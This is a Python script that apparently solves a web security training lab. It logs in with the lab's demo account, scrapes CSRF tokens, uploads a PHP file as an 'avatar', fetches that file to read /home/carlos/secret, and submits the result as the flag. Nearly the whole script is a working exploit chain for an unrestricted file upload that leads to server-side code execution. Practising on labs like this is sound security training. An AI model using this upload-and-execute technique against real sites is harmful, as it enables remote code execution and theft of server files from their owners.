import requests 
import urllib3
import re

# Disable certificate warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Use Burp proxy if needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Take URL input
app_url = input("Enter the full target URL: ").strip()

# create  winer session 

session = requests.Session()



res= session.get(app_url+"/login",verify=False,proxies=proxies)
token_pattern = re.search(r'name="csrf" value="(.+?)"',res.text)  # way to find csrf token
ftoken = token_pattern.group(1)
print("CSRF token is", ftoken)

data = {"username":"wiener","password":"peter","csrf":ftoken}

login_post = session.post(app_url+"/login",verify=False,proxies=proxies,data=data)
print("session for admin is", session.cookies.get_dict())


 # 2025-08-15-12-43-52.png

"""

<form class=login-form id=avatar-upload-form action="/my-account/avatar" method=POST enctype="multipart/form-data">
                            <p>
                            <img src="/resources/images/avatarDefault.svg" class=avatar>
                            </p>
                            <label>Avatar:</label>
                            <input type=file name=avatar>
                            <input type=hidden name=user value=wiener />
                            <input required type="hidden" name="csrf" value="KyqGNSNeoAQCyjNYdROEUKKRc5lhojzp">
                            <button class=button type=submit>Upload</button>
                        </form>



files = {
    'field_name': ('filename.ext', file_content, 'mime/type'),
    'text_field1': (None, 'value1'),
    'text_field2': (None, 'value2')
}


"""


csrf2_res = session.get(app_url + "/my-account?id=wiener", verify=False, proxies=proxies)
token_pattern2 = re.search(r'name="csrf" value="(.*?)"', csrf2_res.text)
ftoken2 = token_pattern2.group(1)
print("Fresh CSRF token:", ftoken2)



exploit = "<?php echo file_get_contents('/home/carlos/secret'); ?>"

files = {
    # 'avatar' is the name of the <input type="file" name="avatar"> field expected by the server.
    # We're uploading a file named 'index.php' with content in the 'exploit' variable.
    # 'application/octet-stream' is a generic MIME type indicating we're sending binary data (like PHP code).
    'avatar': ('index.php', exploit, 'application/octet-stream'),

    # 'user' is a regular form field (like <input type="text" name="user">).
    # We use (None, username) to tell requests this is NOT a file upload — just a plain text field.
    'user': (None, 'wiener'),

    # 'csrf' is also a regular form field (probably from a hidden <input type="hidden" name="csrf">).
    # Again, we use (None, ftoken2) to send it as plain form data, not as a file.
    'csrf': (None, ftoken2)
}




upload = session.post(app_url+"/my-account/avatar", proxies=proxies, files=files, verify=False)
print("Cookies after login:", session.cookies.get_dict())

# to check files is sucessfully uploaded or not 
if "The file avatars/index.php has been uploaded" in upload.text:
    print("file is successfully uploaded")


# now we fetch the content from files/avatars/index.php
    
fetch_upload = session.get(app_url+"/files/avatars/index.php",proxies=proxies,verify=False)
flag = fetch_upload.text
print(flag)

# now submitSolution 

submit_flag = session.post(app_url+"/submitSolution",proxies=proxies,verify=False,data={"answer": flag})
if '"correct":true' in submit_flag.text:
    print("flag submit sucessfully")